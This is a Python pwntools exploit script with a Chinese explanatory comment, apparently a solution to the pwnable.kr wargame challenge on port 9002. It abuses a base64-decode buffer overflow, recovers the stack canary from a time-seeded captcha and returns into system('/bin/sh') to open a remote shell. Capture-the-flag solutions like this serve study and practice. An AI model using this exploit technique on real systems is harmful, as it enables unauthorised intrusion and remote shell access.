#coding=utf-8


'''
这题的漏洞在于：g_buf 长度为1024，1024字节长的b64解码后为700多字节，而接受解码后数据的缓冲区只有512字节，就造成了缓冲区溢出
第一个难点在于需要绕过canary，在my_hash中可以发现，captcha是通过canary和rand()出来的一些值计算出来的
而由于使用的time值就是实际时间，所以可以通过time.time()，然后运行一个一样的c程序来计算canary值
canary在512字节的缓冲区之后，然后再加12个字节到达返回地址的位置，覆盖为call system指令的地址
然后参数设为 /bin/sh 的地址，这个字符串的地址在g_buf上，离g_buf的距离为填充进去的之前所有字节base64编码后的长度
'''
from pwn import *
context(log_level='debug')

r = remote('pwnable.kr', 9002)

system_addr = 0x8049187  # call system 地址
g_buf_addr = 0x804b0e0  # g_buf 的地址，也就是那个1024字节的buf

r.recvline()
msg = r.recvline()
captcha = int(msg.split(' : ')[1])
r.sendline(str(captcha))
t = int(time.time())



canary = int("0x" + os.popen("./deal %s %s" % (t,captcha)).read().strip(),16)
print('[canary]'+str(canary))

r.recvuntil("me!\n")
payload = 'A'*512+p32(canary)+'A'*12+p32(system_addr)
payload += p32(g_buf_addr + len(b64e('A'*(512+4+12+4+4))))
payload = b64e(payload)
payload += '/bin/sh\x00'
r.sendline(payload)
r.interactive()

